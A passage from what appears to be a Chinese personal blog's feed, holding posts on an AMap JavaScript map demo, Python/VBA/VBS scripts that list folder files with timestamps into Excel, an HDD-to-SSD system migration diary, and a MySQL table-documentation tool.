<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;el-col :span=&quot;16&quot;&gt;</span><br><span class="line">  &lt;el-form-item label prop=&quot;code&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;amap-page-container&quot;&gt;</span><br><span class="line">      &lt;el-amap</span><br><span class="line">        vid=&quot;amapDemo&quot;</span><br><span class="line">        :center=&quot;center&quot;</span><br><span class="line">        :amap-manager=&quot;amapManager&quot;</span><br><span class="line">        :zoom=&quot;zoom&quot;</span><br><span class="line">        :events=&quot;events&quot;</span><br><span class="line">        class=&quot;amap-demo&quot;</span><br><span class="line">      &gt;&lt;/el-amap&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/el-form-item&gt;</span><br><span class="line">&lt;/el-col&gt;</span><br></pre></td></tr></table></figure>

<h2 id="高德地图jsAPI"><a href="#高德地图jsAPI" class="headerlink" title="高德地图jsAPI"></a>高德地图jsAPI</h2><p>主要记录这部分代码，后来从Vue中独立出来。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=&quot;container&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;script src=&quot;https://webapi.amap.com/maps?v=1.4.4&amp;key=你的高德地图key&amp;plugin=AMap.Geocoder&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var map = new AMap.Map(&apos;container&apos;);</span><br><span class="line"></span><br><span class="line">var markers = [];</span><br><span class="line">var contentAry = [&quot;注册&quot;, &quot;发函&quot;, &quot;回函&quot;];</span><br><span class="line">var lineStyleAry = [&quot;#80d8ff&quot;, &quot;#ff304e&quot;];</span><br><span class="line">var textStyleAry = [</span><br><span class="line">	&#123;&quot;background-color&quot;: &quot;#29b6f6&quot;, &quot;border-color&quot;: &quot;#e1f5fe&quot;, &quot;font-size&quot;: &quot;12px&quot;&#125;,</span><br><span class="line">	&#123;&quot;background-color&quot;: &quot;#f62972&quot;, &quot;border-color&quot;: &quot;#fee1ee&quot;, &quot;font-size&quot;: &quot;12px&quot;&#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">// 地理编码，什么时候检索完不可控（顺序有时也会变）</span><br><span class="line">var index = 0;</span><br><span class="line">/*</span><br><span class="line">var geocoder = new AMap.Geocoder(&#123;</span><br><span class="line">	city: &quot;010&quot;, //城市设为北京，默认：“全国”</span><br><span class="line">&#125;);</span><br><span class="line">geoCode(&quot;八大胡同&quot;);</span><br><span class="line">geoCode(&quot;三里屯&quot;);</span><br><span class="line">geoCode(&quot;中关村&quot;);</span><br><span class="line"></span><br><span class="line">function geoCode(address) &#123;</span><br><span class="line">	geocoder.getLocation(address, function(status, result) &#123;</span><br><span class="line">		if (status === &apos;complete&apos; &amp;&amp; result.geocodes.length) &#123;</span><br><span class="line">			var lnglat = result.geocodes[0].location;</span><br><span class="line">			var marker = new AMap.Marker();</span><br><span class="line">			marker.setPosition(lnglat);</span><br><span class="line">			map.add(marker);</span><br><span class="line">			marker.setLabel(&#123;</span><br><span class="line">				offset: new AMap.Pixel( - 7, -6),</span><br><span class="line">				direction: &quot;center&quot;,</span><br><span class="line">				content: contentAry[index]</span><br><span class="line">			&#125;);</span><br><span class="line">			markers[index] = marker;</span><br><span class="line">			map.setFitView(marker);</span><br><span class="line">			index++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br><span class="line">*/</span><br><span class="line">// TODO 坐标点写死</span><br><span class="line">markers = [[116.386511, 39.891422], [116.457960, 39.928583], [116.315869, 39.981125]];</span><br><span class="line">// 标记点</span><br><span class="line">markers.forEach(function(marker) &#123;</span><br><span class="line">	var mk = new AMap.Marker(&#123;</span><br><span class="line">	  map: map,</span><br><span class="line">	  position: [marker[0], marker[1]]</span><br><span class="line">	&#125;);</span><br><span class="line">	mk.setLabel(&#123;</span><br><span class="line">	  offset: new AMap.Pixel(-7, -6),</span><br><span class="line">	  direction: &quot;center&quot;,</span><br><span class="line">	  content: contentAry[index]</span><br><span class="line">	&#125;);</span><br><span class="line">	index++;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// TODO 坐标点写死</span><br><span class="line">var p1 = new AMap.LngLat(116.386511, 39.891422);</span><br><span class="line">var p2 = new AMap.LngLat(116.457960, 39.928583);</span><br><span class="line">var p3 = new AMap.LngLat(116.315869, 39.981125);</span><br><span class="line">// 连线标记距离</span><br><span class="line">drawLineDistance(p1, p2, lineStyleAry[0], textStyleAry[0]);</span><br><span class="line">drawLineDistance(p2, p3, lineStyleAry[1], textStyleAry[1]);</span><br><span class="line"></span><br><span class="line">// 根据地图上添加的覆盖物分布情况，自动缩放地图到合适的视野级别，参数均可缺省</span><br><span class="line">map.setFitView();</span><br><span class="line"></span><br><span class="line">function drawLineDistance(p1, p2, lineStyle, textStyle) &#123;</span><br><span class="line">	var textPos = p1.divideBy(2).add(p2.divideBy(2));</span><br><span class="line">	// 距离</span><br><span class="line">	var distance = Math.round(p1.distance(p2));</span><br><span class="line">	var path = [p1, p2];</span><br><span class="line"></span><br><span class="line">	var line = new AMap.Polyline(&#123;</span><br><span class="line">		map: map,</span><br><span class="line">		strokeColor: lineStyle,</span><br><span class="line">		isOutline: true,</span><br><span class="line">		outlineColor: &quot;white&quot;,</span><br><span class="line">		path: path</span><br><span class="line">	&#125;);</span><br><span class="line">	// 连线</span><br><span class="line">	line.setPath(path);</span><br><span class="line">	// 设置文本</span><br><span class="line">	var text = new AMap.Text(&#123;</span><br><span class="line">		text: &quot;两点相距&quot; + distance + &quot;米&quot;,</span><br><span class="line">		position: textPos,</span><br><span class="line">		map: map,</span><br><span class="line">		style: textStyle</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<p>效果如下</p>
<iframe width="100%" height="500px" src="https://xuchunlei.top/gaodeMap.html"></iframe>]]></content>
      <tags>
        <tag>Vue.js</tag>
        <tag>高德地图</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>批量获取文件夹下所有文件信息(修改时间)</title>
    <url>/2023/11/26/%E6%89%B9%E9%87%8F%E8%8E%B7%E5%8F%96%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%8B%E6%89%80%E6%9C%89%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF-%E4%BF%AE%E6%94%B9%E6%97%B6%E9%97%B4/</url>
    <content><![CDATA[<h2 id="批量获取文件夹下所有文件信息-修改时间"><a href="#批量获取文件夹下所有文件信息-修改时间" class="headerlink" title="批量获取文件夹下所有文件信息(修改时间)"></a>批量获取文件夹下所有文件信息(修改时间)</h2><p><em>依旧是给朋友写的小工具，在原来写的几个小工具上改的，写成Python版本后，又写了VBA版（个人还是喜欢VBA）和VBS版，其他版本暂时不想搞了，意义不大</em></p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol>
<li>打开一个文件对话框，用于选择文件夹</li>
<li>便利文件夹下所有文件，包含子文件夹下文件，但不包含子文件夹本身</li>
<li>获取文件信息，并写入Excel文件中</li>
</ol>
<p>这里只获取了文件创建时间，修改时间。其他文件属性根据实际情况自行添加</p>
<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>直接上代码</p>
<h4 id="1-Python"><a href="#1-Python" class="headerlink" title="1 Python"></a>1 Python</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">import tkinter as tk</span><br><span class="line">from tkinter import filedialog</span><br><span class="line">from tkinter import messagebox</span><br><span class="line"></span><br><span class="line">import xlwings as xw</span><br><span class="line"></span><br><span class="line">import time</span><br><span class="line">import datetime</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">print(&quot;请选择要读取的文件夹&quot;)</span><br><span class="line">foldr_patch = filedialog.askdirectory() # 选择文件夹</span><br><span class="line"></span><br><span class="line"># 遍历文件夹及其子文件夹中的文件，并存储在一个列表中</span><br><span class="line"># 输入文件夹路径、空文件列表[]</span><br><span class="line"># 返回 文件列表Filelist,包含文件名（完整路径）</span><br><span class="line">def get_filelist(dir, FileList):</span><br><span class="line">	newDir = dir</span><br><span class="line">	# 判断文件</span><br><span class="line">	if os.path.isfile(dir):</span><br><span class="line">		FileList.append(dir)</span><br><span class="line">	elif os.path.isdir(dir):</span><br><span class="line">		for s in os.listdir(dir):</span><br><span class="line">			newDir = os.path.join(dir, s)</span><br><span class="line">			get_filelist(newDir, FileList)</span><br><span class="line">	return FileList</span><br><span class="line"></span><br><span class="line">if foldr_patch == &apos;&apos;:</span><br><span class="line">	exit() #未选择文件夹时退出</span><br><span class="line"></span><br><span class="line">items = get_filelist(foldr_patch, [])</span><br><span class="line"></span><br><span class="line"># 打开Excel程序，默认设置：程序可见，只打开不新建工作薄，屏幕更新关闭</span><br><span class="line">app = xw.App(visible = True, add_book = False)</span><br><span class="line">app.display_alerts = False</span><br><span class="line">app.screen_updating = False</span><br><span class="line">#新建工作簿</span><br><span class="line">newWb = app.books.add()</span><br><span class="line">newWb.sheets.active.range(&apos;A1&apos;).value = &apos;文件名&apos;</span><br><span class="line">newWb.sheets.active.range(&apos;A1&apos;).column_width = 45.5</span><br><span class="line">newWb.sheets.active.range(&apos;B1&apos;).value = &apos;创建时间&apos;</span><br><span class="line">newWb.sheets.active.range(&apos;B1&apos;).column_width = 15.88</span><br><span class="line">newWb.sheets.active.range(&apos;C1&apos;).value = &apos;最近修改时间&apos;</span><br><span class="line">newWb.sheets.active.range(&apos;C1&apos;).column_width = 15.88</span><br><span class="line">newWb.sheets.active.range(&apos;A1:C1&apos;).api.Font.Bold = True #粗体</span><br><span class="line">newWb.sheets.active.range(&apos;A1:C1&apos;).api.HorizontalAlignment = -4108 # -4108 水平居中</span><br><span class="line">newWb.sheets.active.range(&apos;A1:C1&apos;).api.Borders(9).LineStyle = 1 # Borders(9) 底部边框，LineStyle = 1 直线</span><br><span class="line">newWb.sheets.active.range(&apos;A1:C1&apos;).api.Borders(7).LineStyle = 1 # Borders(7) 左边框</span><br><span class="line">newWb.sheets.active.range(&apos;A1:C1&apos;).api.Borders(8).LineStyle = 1 # Borders(8) 顶部框</span><br><span class="line">newWb.sheets.active.range(&apos;A1:C1&apos;).api.Borders(10).LineStyle = 1 # Borders(10) 右边框</span><br><span class="line">newWb.sheets.active.range(&apos;A1&apos;).api.Borders(10).LineStyle = 1</span><br><span class="line">newWb.sheets.active.range(&apos;B1&apos;).api.Borders(10).LineStyle = 1</span><br><span class="line">newWb.sheets.active.range(&apos;C1&apos;).api.Borders(10).LineStyle = 1</span><br><span class="line"></span><br><span class="line">rowNum = 2</span><br><span class="line"></span><br><span class="line">for item in items:</span><br><span class="line"></span><br><span class="line">	print(rowNum - 1)</span><br><span class="line">	print(os.path.basename(item))</span><br><span class="line">	newWb.sheets.active.range(&apos;A&apos; + str(rowNum)).value = os.path.basename(item)</span><br><span class="line">	newWb.sheets.active.range(&apos;B&apos; + str(rowNum)).value = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime(os.path.getctime(item)))</span><br><span class="line">	newWb.sheets.active.range(&apos;C&apos; + str(rowNum)).value = datetime.datetime.fromtimestamp(os.path.getmtime(item))</span><br><span class="line"></span><br><span class="line">	rowNum += 1</span><br><span class="line"></span><br><span class="line">newWb.sheets.active.range(&apos;A2:K&apos; + str(rowNum)).api.WrapText = True #自动换行</span><br><span class="line"></span><br><span class="line">#两种当前路径保存方法</span><br><span class="line">#①</span><br><span class="line"># 脚本直接运行与打包成exe运行获取路径有所不同</span><br><span class="line">#if getattr(sys, &apos;frozen&apos;, False):</span><br><span class="line">#    application_path = os.path.dirname(sys.executable)</span><br><span class="line">#elif __file__:</span><br><span class="line">#    application_path = os.path.dirname(__file__)</span><br><span class="line">#newWb.save(application_path + &quot;\\result.xlsx&quot;)</span><br><span class="line">#②</span><br><span class="line">newWb.save(&quot;./result.xlsx&quot;)</span><br><span class="line"></span><br><span class="line">newWb.close()</span><br><span class="line"></span><br><span class="line">app.quit()</span><br><span class="line"></span><br><span class="line">messagebox.showinfo(&quot;提示&quot;,&quot;程序执行完成&quot;)</span><br></pre></td></tr></table></figure>

<h4 id="2-VBA"><a href="#2-VBA" class="headerlink" title="2 VBA"></a>2 VBA</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Public rowNum%</span><br><span class="line"></span><br><span class="line">Sub getExcel()</span><br><span class="line"></span><br><span class="line">    Dim wk As Excel.Workbook</span><br><span class="line"></span><br><span class="line">    Dim filePath$</span><br><span class="line">    filePath = getFile()</span><br><span class="line">    If filePath = &quot;&quot; Then</span><br><span class="line">        Exit Sub</span><br><span class="line">    End If</span><br><span class="line">    </span><br><span class="line">    Dim FSO As FileSystemObject</span><br><span class="line">    Dim fld As Folder</span><br><span class="line">    </span><br><span class="line">    Dim Fl  As file</span><br><span class="line">    Set FSO = CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">    Set fld = FSO.GetFolder(filePath)</span><br><span class="line">    </span><br><span class="line">    rowNum = 2</span><br><span class="line">    Call FolderTraversalInfo(fld)</span><br><span class="line">    </span><br><span class="line">    &apos;Workbooks(1).Sheets(&quot;数据收集&quot;).Activate</span><br><span class="line">    MsgBox &quot;获取完成&quot;</span><br><span class="line"></span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">&apos;获取目标文件夹</span><br><span class="line">Function getFile() As String</span><br><span class="line">    Dim sFile As String</span><br><span class="line">    With Application.FileDialog(msoFileDialogFolderPicker)</span><br><span class="line">        If .Show = -1 Then sFile = .SelectedItems(1)</span><br><span class="line">    End With</span><br><span class="line">    getFile = sFile</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">&apos;获取内容</span><br><span class="line">Sub getInfo(filePath As String, fileName As String)</span><br><span class="line">    Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">    Set file = fs.getFile(filePath)</span><br><span class="line">    Worksheets(&quot;数据收集&quot;).Cells(rowNum, 1) = fileName</span><br><span class="line">    Worksheets(&quot;数据收集&quot;).Cells(rowNum, 2) = file.DateCreated</span><br><span class="line">    Worksheets(&quot;数据收集&quot;).Cells(rowNum, 3) = file.DateLastModified</span><br><span class="line">    </span><br><span class="line">    rowNum = rowNum + 1</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">&apos;遍历文件夹以及子文件夹（文件信息获取用）</span><br><span class="line">Sub FolderTraversalInfo(rootfld As Object)</span><br><span class="line">    Dim file As Object</span><br><span class="line">    Dim fld As Object</span><br><span class="line">    </span><br><span class="line">    For Each file In rootfld.Files</span><br><span class="line">        Call getInfo(file.Path, file.Name)</span><br><span class="line">    Next</span><br><span class="line">    </span><br><span class="line">    If rootfld.SubFolders.Count = 0 Then</span><br><span class="line">        Exit Sub</span><br><span class="line">    Else</span><br><span class="line">        For Each fld In rootfld.SubFolders</span><br><span class="line">            Call FolderTraversalInfo(fld)</span><br><span class="line">        Next</span><br><span class="line">    End If</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>

<p>文件格式以及执行结果展示<br><img src="/img/20231126/1.png" alt></p>
<h4 id="2-VBS"><a href="#2-VBS" class="headerlink" title="2 VBS"></a>2 VBS</h4><p>注意编码格式，因为代码中包含中文，需要以ANSI格式保存，不然会报错。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set oExcel = CreateObject(&quot;Excel.Application&quot;)</span><br><span class="line">Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">Set myList = CreateObject(&quot;System.Collections.ArrayList&quot;)</span><br><span class="line"></span><br><span class="line">currentpath = fso.GetFolder(&quot;.&quot;).Path</span><br><span class="line"></span><br><span class="line">FilesTree(BrowseForFile)</span><br><span class="line"></span><br><span class="line">&apos;显示当前窗口 </span><br><span class="line">oExcel.Visible = True</span><br><span class="line">&apos;新建</span><br><span class="line">oExcel.WorkBooks.Add</span><br><span class="line"></span><br><span class="line">oExcel.Cells(1, 1).Value = &quot;文件名&quot;</span><br><span class="line">oExcel.Cells(1, 2).Value = &quot;创建时间&quot;</span><br><span class="line">oExcel.Cells(1, 3).Value = &quot;最近修改时间&quot;</span><br><span class="line"></span><br><span class="line">For i = 0 to myList.count - 1</span><br><span class="line">    Set fn = fso.GetFile(myList.Item(i))</span><br><span class="line">    oExcel.Cells(i + 2, 1).Value = fn.Name</span><br><span class="line">    oExcel.Cells(i + 2, 2).Value = fn.DateCreated</span><br><span class="line">    oExcel.Cells(i + 2, 3).Value = fn.DateLastModified</span><br><span class="line">    &apos;MsgBox fn.Name &amp; vblf &amp; fn.DateCreated &amp; vblf &amp; fn.DateLastModified</span><br><span class="line">Next</span><br><span class="line"></span><br><span class="line">&apos;自动调整宽度（指定宽度一直出错，放弃）</span><br><span class="line">oExcel.Sheets(&quot;Sheet1&quot;).columns(1).AutoFit()</span><br><span class="line">oExcel.activeSheet.columns(2).AutoFit()</span><br><span class="line">oExcel.activeSheet.columns(3).AutoFit()</span><br><span class="line"></span><br><span class="line">&apos;另存为</span><br><span class="line">oExcel.activeWorkBook.SaveAs(currentpath &amp; &quot;\result.xlsx&quot;)</span><br><span class="line"></span><br><span class="line">&apos;选择文件夹</span><br><span class="line">Function BrowseForFile()</span><br><span class="line">    &apos;通过Excel实现文件选择</span><br><span class="line">    Set FileDialog = oExcel.FileDialog(4) &apos;4 选择文件夹</span><br><span class="line">    FileDialog.show()</span><br><span class="line">    BrowseForFile = FileDialog.SelectedItems(1)</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">&apos;遍历文件夹</span><br><span class="line">Function FilesTree(sPath)</span><br><span class="line">&apos;遍历一个文件夹下的所有文件夹文件夹</span><br><span class="line">    Set oFso = CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">    Set oFolder = oFso.GetFolder(sPath)</span><br><span class="line">    Set oSubFolders = oFolder.SubFolders</span><br><span class="line">    </span><br><span class="line">    Set oFiles = oFolder.Files</span><br><span class="line">    For Each oFile In oFiles</span><br><span class="line">        myList.add(oFile.Path)</span><br><span class="line">    Next</span><br><span class="line">    </span><br><span class="line">    For Each oSubFolder In oSubFolders</span><br><span class="line">        FilesTree(oSubFolder.Path)&apos;递归</span><br><span class="line">    Next</span><br><span class="line">    </span><br><span class="line">    Set oFolder = Nothing</span><br><span class="line">    Set oSubFolders = Nothing</span><br><span class="line">    Set oFso = Nothing</span><br><span class="line">End Function</span><br></pre></td></tr></table></figure>

<p>尝试过文件数量超过2万+的文件的读取，VBA的效率最高，推荐使用<br><img src="/img/20231126/2.png" alt></p>
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>VBS</tag>
        <tag>VBA</tag>
      </tags>
  </entry>
  <entry>
    <title>改造日记-系统从机械硬盘迁移升级到固态硬盘</title>
    <url>/2021/09/06/%E6%94%B9%E9%80%A0%E6%97%A5%E8%AE%B0-%E7%B3%BB%E7%BB%9F%E4%BB%8E%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%BF%81%E7%A7%BB%E5%8D%87%E7%BA%A7%E5%88%B0%E5%9B%BA%E6%80%81%E7%A1%AC%E7%9B%98/</url>
    <content><![CDATA[<p><em>家人嫌弃家里电脑太慢了，发现瓶颈来自硬盘，于是乎就开始改造计划</em></p>
<h3 id="硬盘选用"><a href="#硬盘选用" class="headerlink" title="硬盘选用"></a>硬盘选用</h3><p>老电脑是联想的品牌机（具体型号大概是天逸510S，没看机身标签。大概的生产时间为2019年到2020年，也不老啊）。CPU为i3-9100，内存4代8G，win10家庭版。硬盘为希捷ST1000DM003，1T容量，7200转，SATA3接口。电脑运行时，硬盘活动时间几乎一直在100%。考虑到成本，最有效的手段就是把机械硬盘替换为固态硬盘。预算200多，最后选用了SATA3的最多的SSD（某宝某东搜索固态硬盘出来一堆）——金士顿A400。本来打算选180￥左右的120G当系统盘的，后来考虑到230￥左右的240G比较划算点，再往上的容量因超预算不考虑。经过几天的等待，硬盘到货了，通过CrystalDiskInfo读取了硬盘信息如下：<br><img src="/img/20210906/1.jpg" alt><br>吐槽一下硬盘信息检测工具CrystalDiskInfo，官方老二次元了！下面是官网下载界面<br><img src="/img/20210906/2.jpg" alt></p>
<h3 id="开始迁移"><a href="#开始迁移" class="headerlink" title="开始迁移"></a>开始迁移</h3><p>早上不到5点起床，开始往店里迁移……打开方式不对，重来一遍。拆开机箱，开始迁移升级工作。一上来就给我一个惊喜，品牌机就是品牌机，“物尽其用”，居然只有一根电源线……看来不能挂两块硬盘了，有点庆幸买了240G的了。看来不能直接接在主板上进行系统迁移了，还好带了硬盘盒子，接好电源和USB数据线，正式开始迁移升级。<br><img src="/img/20210906/3.jpg" alt></p>
<ol>
<li><p>准备DiskGenius数据恢复及分区管理软件<br>从DiskGenius官网下载对应系统位数的软件，这里是64位的，免费版功能足够。绿色版，可以直接运行。<br><img src="/img/20210906/4.jpg" alt></p>
</li>
<li><p>系统迁移<br>选择菜单：工具-系统迁移，打开系统迁移设置对话框<br><img src="/img/20210906/5.jpg" alt><br>选择目标磁盘（这里是新硬盘，目标硬盘大于原盘容量已用容量才行），然后确定<br><img src="/img/20210906/6.jpg" alt><br>DiskGenius会自动设置，包括隐藏分区，这里有4个分区。因为是USB挂载的硬盘，SATA连接的时候这里选项应该不同，比如设置电脑启动顺序啥的。点击开始<br><img src="/img/20210906/7.jpg" alt><br>选择迁移模式，这里选择热迁移，有数据的话在这之前还会警告你会覆盖数据<br><img src="/img/20210906/8.jpg" alt><br>开始迁移，时间为预估，不是很准确<br><img src="/img/20210906/9.jpg" alt><br>迁移完成提示，如果是SATA挂在的话，会提示让你进BIOS更改启动顺序。点击确定<br><img src="/img/20210906/10.jpg" alt><br>至此系统迁移完成，结构与原来一致。点击完成，关闭对话框<br><img src="/img/20210906/11.jpg" alt></p>
</li>
<li><p>非系统盘迁移<br>还好老电脑只有两个分区，并且使用容量并不是很多。系统分区迁移完，还有一个D盘，于是一块迁了。<br>把新硬盘剩下的空间建一个新的分区，新硬盘右键-建立新分区，打开调整分区容量对话框<br><img src="/img/20210906/12.jpg" alt><br>默认全部分配，点击开始<br><img src="/img/20210906/13.jpg" alt><br>警告提示，确认无误后选择是<br><img src="/img/20210906/14.jpg" alt><br>建立新分区完成，点击完成，关闭对话框<br><img src="/img/20210906/15.jpg" alt><br>选择要克隆的分区，右键-克隆分区，打开克隆分区(卷)和选择目标分区(卷)对话框<br><img src="/img/20210906/16.jpg" alt><br>选择新建好的分区，点击确定<br><img src="/img/20210906/17.jpg" alt><br>三种克隆方式，这里两个分区的大小不同，只能选择按文件复制。点击开始<br><img src="/img/20210906/18.jpg" alt><br>覆盖警告，确认无误后点击确定<br><img src="/img/20210906/19.jpg" alt><br>选择迁移模式，这里依旧选择热迁移<br><img src="/img/20210906/20.jpg" alt><br>克隆完成。点击完成，关闭对话框<br><img src="/img/20210906/21.jpg" alt></p>
</li>
<li><p>硬盘替换<br>因为没有多余的电源线，不能挂两个硬盘了。把原来的机械硬盘拆卸下来，换上固态硬盘（使用了硬盘支架，2.5寸直接固定太难了）<br><img src="/img/20210906/22.jpg" alt></p>
</li>
</ol>
<h3 id="开机测试"><a href="#开机测试" class="headerlink" title="开机测试"></a>开机测试</h3><p>开机正常，开机时间从原来的30s左右提升到十几秒，最快到10s左右，开机速度提升2到3倍。硬盘活动时间明显改善，打开软件也比原来丝滑了。电脑除了硬盘容量外，其余都和原来一样。<br><img src="/img/20210906/23.jpg" alt><br>因为换固态了，所以停掉了碎片整理<br><img src="/img/20210906/24.jpg" alt><br>最后GET到了一块1T机械硬盘。<br><img src="/img/20210906/25.jpg" alt><br>发现现在联想还在卖这个系列的电脑，好像除了CPU升级为10代外，其他没有太大变化，呵呵……</p>
]]></content>
      <tags>
        <tag>硬盘</tag>
        <tag>改造</tag>
      </tags>
  </entry>
  <entry>
    <title>新瓶装旧酒-MySQL数据库表结构文档生成工具分享</title>
    <url>/2024/11/15/%E6%96%B0%E7%93%B6%E8%A3%85%E6%97%A7%E9%85%92-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E7%BB%93%E6%9E%84%E6%96%87%E6%A1%A3%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/</url>
    <content><![CDATA[<p><em>主要就是分享一下自己以前写的工具，可以直接跳转到最后链接获取</em></p>
<p><em>翻开博客，发现已经快一年没有写新博客了，因为不做开发很多年了，又没有去接触新技术的想法，也就没有遇到什么要解决的问题，帮朋友做的小工具还不足以发篇博客（水是能水出来的，又不是没水过）。最近尝试修改下博客，发现一个if判断都要想半天，不加注释，自己写的都得理解半天。有时候觉得以前的自己真的很强，真的喜欢编程，把兴趣变成工作，现在不写代码多年，已经跟不上时代的步伐。以前做微信公众号的时候也是兴趣使然，看看以前写的文章是真能码字，现在没了当初的热情。一看阅读量个位数，还是朋友和自己看的吧。年底了，最近也有点自己的时间，看看以前写的文章，以前写的代码，了解一下过去的自己。对自己好点吧，自己才能好一点。</em></p>
<p>第一次发表于2018年7月的文章-<a href="https://mp.weixin.qq.com/s/pFTuW7iR8Ex4k2WtkSPaEQ" target="_blank" rel="noopener">MySQL数据库表结构文档生成工具随笔</a>，当时正是工具第一版写出来的时候。感兴趣可以去阅读一下，挽救下个位数的阅读量。废话有点多，就基本逻辑那能看一下，直接摘抄下来。</p>
<blockquote>
<p>起因是想理解一下数据库结构，但是没有相应的文档，就打算边看边写。但是数据库有接近180的表，就有了写工具的想法。文档的话，首选VBA。源文件是基于Navicat for &gt;MySQL抽出的数据库结构文件。生成的结构是desc 表返回的结果去掉Extra列。<br>主要是晚上在公司写的，花费了4晚上，白天有一段时间在测试。本身难度不大，就是MySQL接触太少，有些地方需求不明确，没法实现。问朋友，也没有太明白的。本来打算实践的，不过查阅了一些资料，有了新的&gt;理解。主要有两个地方，一个是key值的设定。一个是数据类型的覆盖。</p>
<p>Key，网上解释的都大同小异。最后从官网看的文档。MySQL官网对key的解释，版本是8.0，看了一下7.5的解释，都是一样的。链接内容如下；</p>
<blockquote>
<p><a href="https://dev.mysql.com/doc/refman/8.0/en/show-columns.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/show-columns.html</a></p>
</blockquote>
<blockquote>
<p>Key</p>
<p>Whether the column is indexed:</p>
<p>•If Key is empty, the column either is not indexed or is indexed onlyas a secondary column in a multiple-column, nonunique index.</p>
<p>•If Key is PRI, the column is a PRIMARY KEY or is one of the columnsin a multiple-column PRIMARY KEY.</p>
<p>•If Key is UNI, the column is the first column of a UNIQUE index. (AUNIQUE index permits multiple NULL values, but you can tell whether the columnpermits NULL by &gt;checking the Null field.)</p>
<p>•If Key is MUL, the column is the first column of a nonunique indexin which multiple occurrences of a given value are permitted within the column.</p>
<p>If more than one of the Key values appliesto a given column of a table, Key displays the one with the highest priority,in the order PRI, UNI, MUL.</p>
<p>A UNIQUE index may be displayed as PRI ifit cannot contain NULL values and there is no PRIMARY KEY in the table. AUNIQUE index may display as MUL if several columns &gt;form a composite UNIQUEindex; although the combination of the columns is unique, each column can stillhold multiple occurrences of a given value.</p>
</blockquote>
<blockquote>
<p>列中可能存在的索引：</p>
<p>•如果键是空的, 则该列没有索引或是非唯一索引的非第一行。</p>
<p>•如果键是PRI，则列是主键或多列主键中的列之一。</p>
<p>•如果键是UNI，则该列是唯一索引的第一列。(唯一索引允许多个空值，但可以通过检查Null字段来判断该列是否允许空。)</p>
<p>•如果键为MUL，则该列是非唯一索引的第一列，其中允许在列中多次出现给定值。</p>
<p>如果不止一个键值应用于表的给定列，则键以优先级PRI、UNI、MUL的顺序显示优先级最高的一个。</p>
<p>如果不能包含空值且表中没有主键，则可以显示唯一索引作为PRI。如果多个列形成复合唯一索引，则唯一索引可以显示为MUL；尽管列的组合是唯一的，但每个列仍然可以保持给定值的多次出现。</p>
</blockquote>
<p>我的理解，也是按照下边逻辑写的，没有主键有唯一的情况未考虑：</p>
<blockquote>
<p>只要是主键就表示PRI。</p>
<p>只要是单列唯一索引就表示UNI。</p>
<p>多列组合唯一索引第一列，非唯一索引第一列表示MUL。</p>
<p>唯一索引的非第一行，不表示。</p>
</blockquote>
</blockquote>
<p>后来有几次bug修改，以及一些功能优化，添加，更新记录如下：<br><img src="/img/20241115/1.png" alt><br>1.4.0的时候出了一个插曲，完成删库成就，具体可以看下这篇文章-<a href="https://mp.weixin.qq.com/s/_WQxH-DDec8Sov5MPPPiaQ" target="_blank" rel="noopener">某码农的代码碎片5-删库跑路</a><br>最后一版还是B站go语言源代码泄露的时候改的，手动滑稽</p>
<p>操做页面里有写，根据需要勾选选项，点按钮，选择对应的sql结构文件就行。<br><img src="/img/20241115/2.png" alt></p>
<p>生成表结构的效果图<br><img src="/img/20241115/3.png" alt></p>
<p>最后工具获取链接：<br><a href="https://xuchunlei.top/MySQL数据库表结构文档生成工具V1.5.0.xlsm">MySQL数据库表结构文档生成工具V1.5.0.xlsm</a></p>
]]></content>
      <tags>
        <tag>MySQL</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>简单使用Tesseract提取视频字幕</title>
    <url>/2025/02/25/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8Tesseract%E6%8F%90%E5%8F%96%E8%A7%86%E9%A2%91%E5%AD%97%E5%B9%95/</url>
